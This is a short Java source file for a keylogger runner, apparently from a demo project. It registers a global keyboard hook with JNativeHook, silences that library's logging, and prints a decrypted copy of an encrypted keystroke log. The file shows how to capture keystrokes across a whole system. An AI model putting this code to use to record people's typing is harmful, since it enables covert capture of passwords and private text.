package com.keyguard.javakeyguard.keylogger;

import com.keyguard.javakeyguard.keylogger.capture.GlobalKeyListener;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.keyguard.javakeyguard.keylogger.encryption.EncryptionService;

import java.util.logging.Level;
import java.util.logging.Logger;

public class KeyloggerRunner {
    private final EncryptionService encryptionService = new EncryptionService();

    public void start() {
        disableJNativeHookLogs();

        try {
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(new GlobalKeyListener());
            System.out.println("Keylogger started...");
        } catch (NativeHookException e) {
            throw new RuntimeException("Failed to start native hook", e);
        }
    }

    public void printFinalDecryptedLog() {
        encryptionService.printDecryptedLogFile("logs/encrypted-log.ndjson");
    }

    private void disableJNativeHookLogs() {
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        logger.setUseParentHandlers(false);
    }
}